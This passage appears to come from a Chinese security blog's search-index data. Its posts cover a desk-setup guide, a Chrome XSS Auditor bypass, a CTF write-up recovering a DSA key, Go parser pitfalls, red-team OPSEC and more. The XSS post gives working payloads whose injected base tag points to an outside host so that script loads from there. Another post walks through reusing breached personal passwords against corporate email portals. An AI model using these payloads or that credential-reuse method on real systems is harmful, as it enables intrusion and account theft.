27英寸QHD⤻ͣ\n编程工作台本体\r升降桌⤻ͣ\n久坐显然有害健康，而程序员每天都要长时间坐着工作。站立稍好但也不宜过久，最佳方案是交替使用。电动（或手摇）升降桌能快速切换姿势，满足身体对姿态变化的需求。\n防疲劳脚垫⤻ͣ\n站立工作时，让双脚体验专为久站设计的脚垫\u0026quot;微地形\u0026quot;，可防止足部僵硬和功能退化。\n硬件配置选择\r台式机还是笔记本？\n优先选择性能更强、性价比更高且易升级的台式机。如需频繁移动办公，则选择笔记本。\n设备美化方案\n笔记本扩展坞⤻ͣ（合盖使用时更简洁） 机箱RGB灯效⤻ͣ（提升视觉冲击力） 桌面形态与布局\r直桌vs转角桌\n转角桌虽能放置打印机等设备，但并非编程桌必需品，且可能影响整体简洁感。\n凹形桌的人体工学优势\n凹形设计提供更沉浸的编程体验，给予前臂更多支撑空间（适用于未使用键盘托的情况，后文将详述）。\n笔记本支架⤻ͣ\n保持屏幕与视线平齐，避免头部前倾导致的颈部损伤。作为主屏或副屏使用时都需专用支架支撑。\n显示器支架⤻ͣ\r特别是双屏用户，使用多自由度支架能快速调整屏幕位置，其稳定性和灵活性远超原装底座。\n背光系统⤻ͣ\r合适的灯光既能营造编程氛围，又能缓解视觉疲劳。自定义色彩方案还能提升视频会议/录制时的形象表现。\n键盘托⤻ͣ\r程序员常见的斜方肌紧张问题，多源于键盘鼠标位置过高迫使手臂上抬。安装键盘托使手臂呈水平或微下垂状态，可显著降低肩部负荷。\n机械式人体工学分体键盘⤻ͣ\r传统键盘导致肩部内旋加剧不适，分体设计让双肩保持自然姿态，长期使用改善显著。\n腕托⤻ͣ\r桌面直接使用键盘会导致手腕持续背伸，增加腕管综合征风险。软质腕托能维持手腕中立位。\n可编程多键鼠标⤻ͣ\r为常用命令/窗口管理操作分配快捷键，可大幅提升编程效率。\n超大桌垫⤻ͣ\r提供舒适的鼠标操作区、前臂休息区及键盘防滑面，同时提升桌面整体美感。\n程序员必备高清摄像头⤻ͣ\r现代编程工作离不开视频沟通，高质量摄像头既满足远程协作需求，也适合内容创作。\nKVM切换器⤻ͣ\r多设备用户可通过单一键鼠显示器控制所有主机，提升工作效率。\n降噪耳机⤻ͣ\r隔绝干扰专注编程，旅行时也能创造安静环境。\n专业座椅⤻ͣ\r优质人体工学椅虽需一定投资，但能有效预防腰背疾病，延长职业寿命。\n脚踏板⤻ͣ\r促进腿部血液循环，缓解久坐导致的肌肉紧张和水肿问题。\n音响系统⤻ͣ\r为不戴耳机的场景或多人协作提供音效支持。\n线材管理⤻ͣ\r整洁的布线系统提升视觉清爽度，帮助集中注意力。\n绿植装饰⤻ͣ\r净化空气的同时增添生机。\n艺术陈设⤻ͣ\r根据个人风格选择墙面装饰，完善工作空间个性表达。\n主题摆件⤻ͣ\r动漫/电影角色模型能为工作台注入独特个性。\n","date":"2025-08-01T22:33:33+08:00","permalink":"http://localhost:1313/p/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%80%E4%BD%B3%E6%A1%8C%E9%9D%A2%E9%85%8D%E7%BD%AE%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/","title":"程序员最佳桌面配置终极指南"},{"content":"利用Flash和base标签绕过XSS Auditor\r几天前，我正在和Mario一起研究如何绕过Chrome的XSS Auditor。Mario发现了这个绕过方法：\nXSS Auditor Bypasses 05.2016\n我也发现了另一个绕过方法。在这篇文章中，我想分享我的攻击向量。\n攻击向量\r1 2 3 https://vulnerabledoma.in/xss_auditortest?test=1\u0026amp;q=\u0026lt;embed+allowscriptaccess=always+src=/xss.swf\u0026gt;\u0026lt;base+href=//l0.cm/ \u0026lt;div\u0026gt;\u0026lt;embed allowscriptaccess=always src=/xss.swf\u0026gt;\u0026lt;base href=//l0.cm/\u0026lt;/div\u0026gt; 让我们来看看这个绕过方法的实现过程。\n分析过程\r直接使用\u0026lt;embed\u0026gt;标签加载外部资源会被拦截： 1 2 3 https://vulnerabledoma.in/xss_auditortest?test=1\u0026amp;q=\u0026lt;embed+src=https://evil/\u0026gt; \u0026lt;embed src=https://evil/\u0026gt; 但是加载同源且没有查询字符串的资源不会被拦截： 1 2 3 https://vulnerabledoma.in/xss_auditortest?test=1\u0026amp;q=\u0026lt;embed+src=/aaa\u0026gt; \u0026lt;embed src=/aaa\u0026gt; 如果我们能改变基础URL，就有可能实现XSS攻击。base标签通常也会被拦截，但如果它没有用\u0026gt;闭合，在某些情况下Auditor不会拦截。 以下情况会被拦截：\n1 2 3 https://vulnerabledoma.in/xss_auditortest?test=3\u0026amp;q=\u0026lt;base+href=//evil/ \u0026lt;div\u0026gt;\u0026lt;base href=//evil/ \u0026lt;/div\u0026gt; 但以下情况不会被拦截：\n1 2 3 https://vulnerabledoma.in/xss_auditortest?test=1\u0026amp;q=\u0026lt;base+href=//evil/ \u0026lt;div\u0026gt;\u0026lt;base href=//evil/\u0026lt;/div\u0026gt; 区别在于前者在注入点后有一个空格。看起来如果页面在注入点后直接有空格，Auditor会拦截。换句话说，如果页面在注入点后没有直接的空格，我们就可以注入base标签而不被拦截。\n因此，我的攻击向量有效！\n其他绕过方法\r如果注入点后有空格，我们还有机会绕过。如果注入点下方存在\u0026quot;字符，我们可以使用未闭合的属性引号来绕过Auditor，如\u0026lt;base href=\u0026quot;//evil/。\n以下情况不会被拦截：\n1 2 3 4 5 https://vulnerabledoma.in/xss_auditortest?test=4\u0026amp;q=\u0026lt;embed+allowscriptaccess=always+src=/xss.swf\u0026gt;\u0026lt;base+href=\u0026#34;//l0.cm/ \u0026lt;div\u0026gt; \u0026lt;embed allowscriptaccess=always src=/xss.swf\u0026gt;\u0026lt;base href=\u0026#34;//l0.cm/ \u0026lt;/div\u0026gt;\u0026lt;div id=\u0026#34;x\u0026#34;\u0026gt;AAA\u0026lt;/div\u0026gt; 这个绕过方法很有用，因为大多数页面在注入点下方都有\u0026quot;字符。\n另外，\u0026lt;script src=/xss.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;base href=//evil/也不会被拦截。但我们无法加载外部资源，因为在设置base URL之前就开始加载了：\n1 https://vulnerabledoma.in/xss_auditortest?test=1\u0026amp;q=%3Cscript%20src=/xss.js%3E%3C/script%3E%3Cbase%20href=//evil/ 因此，我使用了Flash来实现攻击。\n总结\r这就是全部内容。感谢阅读我的文章！\n","date":"2025-08-01T22:26:13+08:00","permalink":"http://localhost:1313/p/%E5%88%A9%E7%94%A8flash%E5%92%8Cbase%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87xss-auditor%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"利用Flash和base标签绕过XSS Auditor的技术分析"},{"content":"CSAW CTF Crypto Challenge: Breaking DSA\rTrail of Bits密码学服务团队为最近的CSAW CTF贡献了两道密码学挑战。今天我们将解析其中较简单的一道，题目名为\u0026quot;灾难性安全设备——祝你好运，\u0026lsquo;k？\u0026quot;。\n这道题目涉及数字签名算法(DSA)，展示了表面安全的算法如何通过实现细节变得完全不安全。该挑战利用了两种漏洞，其中一个是PlayStation 3固件破解的根源，另一个则是无数软件产品中常见的安全漏洞来源。\n获取旗帜\r参赛者获得了源代码(main.py)和一个可交互的HTTP服务器。该服务器模拟在线签名服务，包含以下端点：\n/public_key：返回DSA公钥元素(p,q,g,y)的JSON编码整数 /sign/：对数据进行SHA1哈希后使用DSA私钥签名，返回两个整数(r,s) /forgotpass：使用random.getrandbits生成密码重置URL /resetpass：未实现的端点，调用返回500 /challenge：返回有效的Fernet令牌 /capture：当提供有效的Fernet令牌的DSA签名时，返回旗帜 DSA签名机制剖析\r完整的DSA密钥包含5个值：p,q,g,x和y。其中x是私钥值，我们需要恢复它。DSA签名的计算过程如下：\n选择随机数k(0 \u0026lt; k \u0026lt; q) 计算r = (g^k mod p) mod q 计算k的模逆kinv：(k * kinv) % q = 1 计算消息的SHA1哈希h 计算s = (kinv * (h + r * x)) % q 服务器中的签名实现如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 def sign(ctf_key: DSAPrivateKeyWithSerialization, data: bytes) -\u0026gt; tuple(int, int): data = data.encode(\u0026#34;ascii\u0026#34;) pn = ctf_key.private_numbers() g = pn.public_numbers.parameter_numbers.g q = pn.public_numbers.parameter_numbers.q p = pn.public_numbers.parameter_numbers.p x = pn.x k = random.randrange(2, q) kinv = _modinv(k, q) r = pow(g, k, p) % q h = hashlib.sha1(data).digest() h = int.from_bytes(h, \u0026#34;big\u0026#34;) s = kinv * (h + r * x) % q return (r, s) 数学漏洞利用\r从签名方程s = (kinv * (h + r * x)) % q出发，我们可以解出私钥x：\n1 x = (rinv * ((s * k) - h)) % q 关键在于预测随机数k的值。服务器使用Python的random模块(基于梅森旋转算法)生成k，这不是密码学安全的随机数生成器。\n随机数生成器攻击\r通过调用/forgotpass端点，我们可以获取梅森旋转算法的输出：\n1 2 3 4 @app.route(\u0026#34;/forgotpass\u0026#34;) def returnrand() -\u0026gt; str: random_value = binascii.hexlify(struct.pack(\u0026#34;\u0026gt;Q\u0026#34;, random.getrandbits(64))) return \u0026#34;https://innitech.local/resetpass/{}\u0026#34;.format(random_value.decode(\u0026#34;ascii\u0026#34;)) 我们实现了梅森旋转算法的克隆版本，可以预测未来的随机数输出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class ClonedMersenneTwister: length = 624 def __init__(self, state): self.state = state[:] self.index = 0 def next(self): if self.index == 0: self.generate_numbers() y = self.state[self.index] y = y ^ (y \u0026gt;\u0026gt; 11) y = y ^ (y \u0026lt;\u0026lt; 7) \u0026amp; 2636928640 y = y ^ (y \u0026lt;\u0026lt; 15) \u0026amp; 4022730752 y = y ^ (y \u0026gt;\u0026gt; 18) self.index = (self.index + 1) % self.length return y def generate_numbers(self): for i in range(self.length): y = ((self.state[i] \u0026amp; 0x80000000) + ((self.state[(i + 1) % self.length]) \u0026amp; 0x7fffffff)) self.state[i] = self.state[(i + 397) % self.length] ^ (y \u0026gt;\u0026gt; 1) if y % 2: self.state[i] ^= 2567483615 完整攻击流程\r通过多次调用/forgotpass重建RNG内部状态 调用/sign获取签名(r,s) 使用克隆的RNG预测k值 解方程恢复私钥x 验证x的正确性：pow(g,x,p)应当等于y 获取挑战令牌并签名，提交到/capture获取旗帜 总结\r在36小时的CSAW决赛中，44支队伍中有28支成功获取了旗帜。这个挑战展示了密码重置令牌生成与DSA签名随机数生成之间的意外关联，加上DSA算法的脆弱性，导致了灾难性的安全漏洞。\n在实际系统中，应避免使用非密码学安全的随机数生成器。如果不需要高性能或序列可重现性，应优先选择CSPRNG。此外，可以考虑使用更健壮的签名算法如ed25519(RFC 8032)，或采用确定性随机数生成(RFC 6979)来降低风险。\n","date":"2025-08-01T22:18:59+08:00","permalink":"http://localhost:1313/p/%E7%A0%B4%E8%A7%A3csaw-ctf%E5%8A%A0%E5%AF%86%E6%8C%91%E6%88%98dsa%E7%AD%BE%E5%90%8D%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"破解CSAW CTF加密挑战：DSA签名漏洞分析"},{"content":"今天微软发布了MS11-018安全更新，修复了上个月CanSecWest 2011 Pwn2Own竞赛中用于攻破IE8的三个漏洞之一。成功入侵IE8需要组合利用这三个漏洞才能满足主办方的全部要求。\n本次修复的漏洞是一个不影响IE9的释放后使用(UAF)漏洞，攻击者主要利用该漏洞实现代码执行。第二个漏洞用于提高攻击可靠性，第三个漏洞则用于突破IE保护模式。\nIE9为何不受影响？ 在IE9开发过程中，团队内置了多项安全功能以尽早发现安全问题。该漏洞通过模糊测试发现，IE团队在10个月前就已修复。竞赛中用作信息泄露的另一个漏洞同样在IE9开发阶段被发现并修复。\n为何修复速度如此之快？ 通常所有安全补丁都需要经过漫长的回归测试。本次修复同样经历了该流程，但由于该问题曾在IE9上测试过，使得修复进程得以加速。\n其余两个漏洞何时修复？ 需要说明的是：\n第一个是\u0026quot;堆地址泄露\u0026quot;漏洞，攻击者借此可避免大规模堆喷射。需注意该漏洞仅泄露堆地址而非堆内容（如虚表指针） 第二个是IE保护模式绕过漏洞 这两个漏洞正在评估中，将在后续更新周期修复。但若没有MS11-018修复的本月漏洞，其余漏洞不会对用户构成直接威胁。\nFermin J. Serna, MSRC工程团队\n","date":"2025-08-01T22:11:32+08:00","permalink":"http://localhost:1313/p/ms11-018%E4%BF%AE%E5%A4%8Die8-pwn2own%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"MS11-018修复IE8 pwn2own漏洞的技术分析"},{"content":"Go语言解析器中的意外安全陷阱\r在Go应用程序中，解析不可信数据会形成危险的攻击面。通过三个真实攻击场景，我们揭示了Go标准库解析器中的安全隐患：\n攻击场景1：意外(反)序列化数据\r当开发者使用json:\u0026quot;-\u0026quot;标记试图阻止字段被反序列化时，错误添加的逗号后缀会导致该字段仍可通过\u0026quot;-\u0026quot;键被修改：\n1 2 3 type User struct { IsAdmin bool `json:\u0026#34;-,omitempty\u0026#34;` // 错误配置：仍可通过{\u0026#34;-\u0026#34;:true}注入 } 我们创建的Semgrep规则可检测此类问题：semgrep -c r/trailofbits.go.unmarshal-tag-is-dash\n攻击场景2：解析器差异\rGo的JSON解析器存在两项危险特性：\n重复键处理：总是取最后出现的键值 大小写不敏感匹配：\u0026quot;action\u0026quot;、\u0026quot;ACTION\u0026quot;甚至Unicode变体(aKtionſ)都会被匹配 当微服务架构中不同组件使用不同解析器时，这种差异会导致权限绕过：\n1 2 3 graph TD A[恶意请求] --\u0026gt; B{\u0026#34;授权服务:解析为UserAction\u0026#34;} A --\u0026gt; C{\u0026#34;业务服务:解析为AdminAction\u0026#34;} 攻击场景3：数据格式混淆\r通过构造特殊的多格式混合文件(Polyglot)，可使JSON/XML/YAML解析器解析同一文件时产生不同结果：\n1 2 3 4 5 { \u0026#34;action\u0026#34;: \u0026#34;Action_1\u0026#34;, \u0026#34;aCtIoN\u0026#34;: \u0026#34;Action_2\u0026#34;, \u0026#34;comment\u0026#34;: \u0026#34;\u0026lt;action\u0026gt;Action_3\u0026lt;/action\u0026gt;\u0026#34; } 该payload会：\nJSON解析为Action_2（取最后匹配+大小写不敏感） YAML解析为Action_1（精确匹配） XML解析为Action_3（提取XML片段） 防护建议\r启用严格模式： 1 2 decoder := json.NewDecoder(reader) decoder.DisallowUnknownFields() 期待JSON v2：将默认禁止重复键并启用大小写敏感匹配 边界一致性检查：跨服务处理时验证数据格式一致性 使用静态分析：我们提供的Semgrep规则可检测常见错误配置 这些解析器特性已导致真实漏洞，包括Hashicorp Vault认证绕过(CVE-2020-16250)等案例。开发者需要特别警惕大小写不敏感匹配这类Go特有行为。\n","date":"2025-08-01T22:04:53+08:00","permalink":"http://localhost:1313/p/go%E8%AF%AD%E8%A8%80%E8%A7%A3%E6%9E%90%E5%99%A8%E4%B8%AD%E7%9A%84%E6%84%8F%E5%A4%96%E5%AE%89%E5%85%A8%E9%99%B7%E9%98%B1/","title":"Go语言解析器中的意外安全陷阱"},{"content":"突破传统黑客极限\r穿上你的瓜亚贝拉衬衫，Infiltrate盛会即将开启。Trail of Bits自2015年起持续赞助并全员参与这一顶尖会议（今年多达18人！）。除了交换纪念品，我们更期待见证最新安全研究成果——包括我们自己的突破性贡献。\n技术亮点前瞻\r二进制摇滚明星进阶\rSophia d\u0026rsquo;Antoine将联合Binary Ninja开发者呈现《成为二进制摇滚明星：漏洞研究中的高阶静态分析》，基于其先前将抽象解释引入Binary Ninja的研究成果进行深度扩展。\nManticore实战体验\r我们将展示CGC机器人的核心——Manticore二进制符号执行引擎（支持x86/x86-64/ARM架构）。参会者可通过解决挑战任务提前体验这一即将开源的工具，并赢取专属马克杯。\n往届技术回眸\r2016年我们曾分享：\n《构建可扩展的自动化黑客系统》 《Swift逆向工程实践》 NOP认证竞赛中与ImmunityDbg的激烈对抗（7分33秒弹出计算器） 本届重磅议题\rJustin Schuh：《四面楚歌：防御战壕中的现实视角》 Vasilis团队：《安卓libc分配器的堆利用辅助技术》 Jean-Philippe：《Signal应用漏洞狩猎》 Ralf-Phillip：《基带处理器中的shellcode踪迹》 会议独特价值\rInfiltrate以浓缩顶级会议精华内容著称，其特色包括：\n与演讲者/顶尖研究者的深度交流（\u0026ldquo;强力大厅会议\u0026quot;文化） 全包式优质餐饮活动 严禁无票蹭会（笑） \u0026ldquo;拉斯维加斯已成过往，真正的盛宴在迈阿密\u0026rdquo;——我们现场见！\n本文提及的所有技术工具与研究均可在Trail of Bits开源项目库中找到对应实现。\n","date":"2025-08-01T21:58:00+08:00","permalink":"http://localhost:1313/p/%E5%9B%9B%E6%9C%88%E6%B8%97%E9%80%8F%E5%AD%A3-trail-of-bits%E5%8D%9A%E5%AE%A2%E8%81%9A%E7%84%A6%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","title":"四月渗透季 - Trail of Bits博客聚焦二进制分析与漏洞研究"},{"content":"我们刚刚完成了在前期项目中绕过Cylance防护的全过程演示。作为这个精彩系列的收官之作，我想分享几点关键观察。\n首先需要明确，作为渗透测试团队，我们只测试客户实际部署的环境，而非厂商指定的理想配置。尽管使用的技术非常基础（例如简单的脚本混淆和载荷拆分），但这些方法确实有效突破了防护——这本身就值得反思反病毒厂商的宣传话术。\n关于测试权限的争议值得关注。Cylance与CrowdStrike等厂商在用户协议中严格限制第三方测试的行为，这就像汽车厂商禁止媒体评测其产品般荒谬。必须说明的是，Cylance相比传统黑名单反病毒已有显著进步——在我们的测试中，它对某些高级威胁的检测确实展现了优势。\n白名单技术讨论是核心议题。虽然启用应用白名单（如通过AppLocker或SRP）能阻断我们90%的攻击路径，但这并非某个厂商的专利功能。问题在于企业往往因运维成本放弃启用这些功能，而厂商将未启用增强功能作为检测失败的借口并不合理。\n行业现状令人担忧：\n安全产品评测缺乏客观性（如NSS Labs报告存在明显缺陷） 不存在\u0026quot;银弹\u0026quot;解决方案——Cylance宣称的AI预测攻击能力尚未经实践验证 真正的安全需要架构级解决方案，包括应用白名单和出口流量管控 最后必须强调：部署任何高级端点防护产品都不是简单的\u0026quot;轻松按钮\u0026quot;。实施过程需要专业团队持续维护，否则防护效果将大打折扣。\n致谢：本系列技术实现基于Casey Smith和@_TacoRocket的前沿研究，推荐阅读Colby Farley的博客（https://pwningroot.com/）获取更多绕过技巧。\n","date":"2025-08-01T21:50:47+08:00","permalink":"http://localhost:1313/p/%E7%BB%95%E8%BF%87cylance%E9%98%B2%E6%8A%A4%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B/","title":"绕过Cylance防护：第五部分 - 未来展望"},{"content":"红队行动中的数据泄露挑战\r在远程红队演练中，与目标网站的每次交互、发送的每封邮件、探测的每个网络服务都会留下可追溯痕迹。成熟的蓝队能够通过信息关联识别红队行为，进而实施阻断或部署反制措施。\n技术对抗要点\r泄露源头控制\n工作站本地配置（0:40:42） 操作系统级修改（0:45:01） 工具特征伪装（0:49:44） 源IP地址保护体系（0:56:35） 基础设施架构\n故障保护型VPN部署（1:01:36） 第三方服务风险隔离（1:02:57） 网络服务指纹混淆（1:10:05） 标准化流程建设\n新工具测试方法论（1:15:19） 防御视角的OPSEC评估框架（0:38:06） 技术实现路径\r通过系统级修改消除工具特征（如修改C2通信指纹） 构建多跳代理架构实现IP地址保护 建立工具测试沙箱环境验证可检测性 \u0026ldquo;红队必须像防御者一样思考，这种思维模式能适应未来新型工具的安防对抗\u0026rdquo; —— Michael Allen（持有OSCE/MLSE/CISSP认证）\n完整技术幻灯片下载\n加入BHIS技术社区\n","date":"2025-08-01T21:44:07+08:00","permalink":"http://localhost:1313/p/%E8%BF%9C%E7%A8%8B%E7%BA%A2%E9%98%9F%E8%A1%8C%E5%8A%A8%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E6%93%8D%E4%BD%9C%E5%AE%89%E5%85%A8%E6%A0%B8%E5%BF%83%E8%A6%81%E7%82%B9%E8%A7%A3%E6%9E%90/","title":"远程红队行动安全基础 - 操作安全核心要点解析"},{"content":"利用个人账户密码重复问题获取域凭证：无需接入目标网络的攻击方法（第一部分）\r作者：Beau Bullock\n在本系列文章中，我将详细介绍无需接入目标组织网络即可获取域用户凭证的多种方法。第一部分重点探讨如何利用员工在个人账户重复使用企业密码的行为；第二部分将介绍通过发现目标组织的用户名架构，并对外部服务（如Outlook Web Access门户）实施密码喷洒攻击的更复杂技术。\n本文不涉及便利贴密码问题\r个人账户的凭证重用现象\r用户在多个网络服务中重复使用相同密码是普遍存在的安全隐患。当某个网站遭到入侵时，若员工在个人账户和企业账户使用相同密码，攻击者获取个人凭证后即可间接获得企业账户访问权限。\n突破传统分析思路\r常规的凭证泄露分析通常仅关注目标组织拥有的域名。更有效的方法是尝试定位企业员工在第三方服务中泄露的个人账户。当目标组织本身提供个人账户服务时（如Google员工可能拥有gmail.com账户），这种关联会变得更容易。\n实战案例：从5万条泄露数据中定位员工凭证\r在一次测试中，作者通过Pwnedlist.com发现目标组织的客户域名存在超过50,000个近期泄露账户。通过与组织沟通，确认员工可能使用这些\u0026quot;技术上的个人账户\u0026quot;。\n关键步骤：\n使用Pipl.com搜索引擎关联泄露邮箱与员工身份 通过Burp Suite Intruder批量提交50,000个邮箱 筛选包含目标公司名称的\u0026quot;Career\u0026quot;字段 最终定位到252个疑似员工个人账户 凭证转换与验证\r通过侦察获取企业邮箱命名规则（如firstname.lastname@格式）后：\n将个人账户信息转换为企业邮箱格式 使用泄露的密码尝试登录企业外部门户（如OWA） 成功访问重复使用密码的员工企业邮箱 攻击流程总结\r通过Pwnedlist等平台收集目标组织关联的个人账户泄露凭证 使用Pipl验证账户持有人的雇主信息 根据企业邮箱规则转换个人账户信息 尝试凭证重用攻击 防御建议\r推行密码管理工具，杜绝员工在多平台重复使用密码的行为。\n下篇将详细介绍如何通过发现用户名架构实施密码喷洒攻击。点击此处阅读第二部分\n","date":"2025-08-01T21:37:19+08:00","permalink":"http://localhost:1313/p/%E5%88%A9%E7%94%A8%E4%B8%AA%E4%BA%BA%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E5%A4%8D%E9%97%AE%E9%A2%98%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%87%AD%E8%AF%81%E6%97%A0%E9%9C%80%E6%8E%A5%E5%85%A5%E7%9B%AE%E6%A0%87%E7%BD%91%E7%BB%9C%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/","title":"利用个人账户密码重复问题获取域凭证：无需接入目标网络的攻击方法（第一部分）"},{"content":"如何在WooCommerce感谢页面添加转化跟踪代码\r要将转化跟踪代码添加到WooCommerce感谢页面（以Google Ads为例），并动态插入订单值（如金额、货币、order_id），请在子主题的functions.php中使用以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 function custom_conversion_tracking( $order_id ) { $order = wc_get_order( $order_id ); ?\u0026gt; \u0026lt;script\u0026gt; gtag(\u0026#34;event\u0026#34;, \u0026#34;conversion\u0026#34;, { \u0026#34;send_to\u0026#34;: \u0026#34;Tracking-code-here-XXXXXXXXXX\u0026#34;, \u0026#34;value\u0026#34;: \u0026lt;?php echo $order-\u0026gt;get_total(); ?\u0026gt;, \u0026#34;currency\u0026#34;: \u0026#34;\u0026lt;?php echo $order-\u0026gt;get_currency(); ?\u0026gt;\u0026#34;, \u0026#34;transaction_id\u0026#34;: \u0026lt;?php echo $order_id; ?\u0026gt; }); \u0026lt;/script\u0026gt; \u0026lt;?php } add_action( \u0026#39;woocommerce_thankyou\u0026#39;, \u0026#39;custom_conversion_tracking\u0026#39; ); 如果要将代码添加到HEAD中，请使用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function custom_conversion_tracking(){ // 在order-received端点 if( is_wc_endpoint_url( \u0026#39;order-received\u0026#39; ) ) : // 获取订单ID $order_id = absint( get_query_var(\u0026#39;order-received\u0026#39;) ); if( get_post_type( $order_id ) !== \u0026#39;shop_order\u0026#39; ) return; $order = wc_get_order( $order_id ); ?\u0026gt; \u0026lt;script\u0026gt; gtag(\u0026#34;event\u0026#34;, \u0026#34;conversion\u0026#34;, { \u0026#34;send_to\u0026#34;: \u0026#34;Tracking-code-here-XXXXXXXXXX\u0026#34;, \u0026#34;value\u0026#34;: \u0026lt;?php echo $order-\u0026gt;get_total(); ?\u0026gt;, \u0026#34;currency\u0026#34;: \u0026#34;\u0026lt;?php echo $order-\u0026gt;get_currency(); ?\u0026gt;\u0026#34;, \u0026#34;transaction_id\u0026#34;: \u0026lt;?php echo $order_id; ?\u0026gt; }); \u0026lt;/script\u0026gt; \u0026lt;?php endif; } add_action( \u0026#39;wp_head\u0026#39;, \u0026#39;custom_conversion_tracking\u0026#39; ); ","date":"2025-08-01T21:30:47+08:00","permalink":"http://localhost:1313/p/%E5%A6%82%E4%BD%95%E5%9C%A8woocommerce%E6%84%9F%E8%B0%A2%E9%A1%B5%E9%9D%A2%E6%B7%BB%E5%8A%A0%E8%BD%AC%E5%8C%96%E8%B7%9F%E8%B8%AA%E4%BB%A3%E7%A0%81/","title":"如何在WooCommerce感谢页面添加转化跟踪代码"},{"content":"McSema：二进制转LLVM比特码工具重大升级\r我们的x86机器码转LLVM比特码工具McSema刚刚完成全面升级。上周举办的开发马拉松显著改善了McSema的易用性、文档质量和代码质量，现在使用McSema分析和逆向工程二进制文件比以往任何时候都更容易。\n发展阶段\rMcSema已成为我们日常工作中不可或缺的工具，它能帮助我们发现并加固二进制程序的安全漏洞、独立验证供应商源代码，以及生成高代码覆盖率的应用测试。该工具不仅应用于学术研究，还参与DARPA项目。自2014年开源以来，我们（及其他贡献者）持续扩展其功能以分析日益复杂的程序。\n性能优化\r构建速度：通过清理死代码、移除冗余库及优化目录结构，构建系统更简洁 比特码生成：改进控制流图遍历算法，移除Boost依赖，简化比特码生成流程 比特码质量：取消函数入口/出口的寄存器上下文存储，改用原生位宽操作处理标志位，新增惰性生成比特码优化功能 现代化改造\r升级至标准版LLVM 3.8（原使用定制版LLVM 3.5） 完全移除Boost依赖，改用C++11现代特性 功能简化\r统一命令行接口：mcsema-disass负责反汇编，mcsema-lift执行比特码转换 弃用定制反汇编器bin_descend，统一采用IDA Pro作为反汇编引擎 重构代码结构，精简CMake构建脚本 采用无外部依赖的集成测试框架 新增特性\r支持更多指令集（提供指令添加指南） 新增--list-supported命令查看支持指令列表 集成测试框架支持快速添加全面翻译测试 文档完善\r全新文档详细说明安装流程、使用方法、测试方案、功能扩展和调试技巧，并包含常见错误解决方案，显著降低第三方开发者的参与门槛。\n运行时增强\r提升运行效率，大幅降低内存占用，改进与原生Windows/Linux代码的复杂交互能力，使转换后的比特码不仅能用于静态分析，还可重新编译为可执行程序。\n未来规划\r扩展对复杂软件的支持 计划采用Binary Ninja替代IDA Pro进行控制流恢复 新增ARM架构二进制转LLVM比特码功能 拓展移动应用和嵌入式固件分析场景 我们正在招募对McSema开发感兴趣的实习生。入门者可先尝试Linux二进制转换教程，了解如何使libFuzzer等工具作用于二进制文件。如有创新构想，欢迎联系我们——若方案可行，我们将提供资金支持实现。\n","date":"2025-08-01T21:24:22+08:00","permalink":"http://localhost:1313/p/mcsema%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%ACllvm%E6%AF%94%E7%89%B9%E7%A0%81%E5%B7%A5%E5%85%B7%E9%87%8D%E5%A4%A7%E5%8D%87%E7%BA%A7/","title":"McSema二进制转LLVM比特码工具重大升级"},{"content":"州和地方政府网络安全现代化转型\r作者：Darren Estridge 和 Thomas MacLellan\n发布日期：2025年7月8日\n州政府的网络安全领导者们深知，地方机构正日益成为网络攻击的主要目标。从破坏州卫生系统的勒索软件到针对政府员工的钓鱼攻击，威胁不断升级，造成的财务和运营影响也愈发严重。根据《2023年K-12教育系统六年回顾报告》，近80个学区（涉及2000多所学校）遭受勒索软件攻击，导致停课、教学中断及学生数据泄露。然而，许多州机构仍在过度采购功能重复且缺乏整合的网络安全工具，无法匹配攻击的速度和规模。\n防御现代化的新思路\r州IT领导者需要改变防御现代化的方法。与联邦层面类似，单纯增加工具数量并不等同于增强防护。零散的采购会耗尽有限资源、增加操作复杂性并延缓响应速度。出路在于通过战略性的公私合作实现效率提升、系统整合和更智能的投资，借助私营部门的创新能力强化政府防护体系。\n州IT网络安全新战略\r各州机构（无论是公共安全、医疗还是教育部门）的孤立系统会导致重复劳动、响应迟缓以及纳税人资金使用效率低下。州首席信息官（CIO）和安全官（CISO）正意识到必须摆脱这种碎片化模式。Palo Alto Networks通过将安全运营整合至统一的AI驱动平台来支持这一转型——该模式已在联邦机构和财富100强企业中得到验证。\n但任何机构都不应孤军奋战。与私营网络安全供应商的战略合作能带来州IT部门内部无法获取的专业知识和威胁情报。公私合作可实现可扩展、可持续的安全现代化，确保州机构在有效管理资源的同时应对威胁。\n成功现代化的关键考量\r成本优化：减少工具数量可降低许可、维护和培训成本 简化运营：统一安全平台减轻管理负担 安全利用AI：跟踪监控每位员工的AI使用情况 加速威胁响应：AI驱动自动化提升检测与处置速度 改进合规性：集中化可视性实现持续监控以满足报告和合规要求 通过与可信行业伙伴合作，各州可部署跨机构无缝协作的整体平台化解决方案，在降低复杂性的同时提升韧性。这种平台化战略能使州政府将预算从重复浪费转向主动防御。\n规模化AI驱动的防御体系\r该战略的核心是Precision 